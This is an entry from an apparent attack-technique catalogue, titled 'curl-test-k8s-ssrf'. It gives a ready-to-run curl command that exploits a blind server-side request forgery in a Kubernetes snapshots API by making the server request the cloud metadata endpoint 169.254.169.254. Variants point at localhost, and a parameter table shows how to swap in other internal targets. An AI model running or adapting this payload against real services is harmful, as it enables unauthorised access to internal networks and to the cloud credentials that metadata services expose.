---
data: >-
  curl -X POST http://velodrome.canary.k8s.io/api/snapshots -H "Content-Type:
  application/json" -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
tags:
  - ssrf
  - testing
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c4ce5ed7-ffaf-46dc-aa49-5d86b0409d7c
created_at: '2025-12-14T04:08:48.503Z'
updated_at: '2025-12-14T04:08:48.503Z'
verified: false
validated: true
submitted: true
---
# curl-test-k8s-ssrf

## Command

```bash
curl -X POST http://velodrome.canary.k8s.io/api/snapshots -H "Content-Type: application/json" -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

## Description

This command sends a POST request to the Kubernetes snapshots API with a JSON payload containing an arbitrary URL, exploiting the SSRF vulnerability to force the server to request internal metadata services blindly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://velodrome.canary.k8s.io/api/snapshots` | Target endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets the content type header for JSON | Yes |
| `-d '{"url": "http://169.254.169.254/latest/meta-data/"}'` | JSON payload with arbitrary URL (modify URL for different tests) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://velodrome.canary.k8s.io/api/snapshots -H "Content-Type: application/json" -d '{"url": "https://example.com"}'
```

### Advanced Usage

```bash
curl -X POST http://velodrome.canary.k8s.io/api/snapshots -H "Content-Type: application/json" -d '{"url": "http://localhost:8080"}' -v
```

## Expected Output

HTTP response from the API, such as {"status": "success"} or an error code, but no direct output from the forged internal request due to the blind SSRF nature. Use -v flag for verbose details on headers and timing.

## Related

- [[Related Procedure|procedures/Exploiting-Blind-SSRF-via-JSON-Parameter-in-Kubernetes-API]]
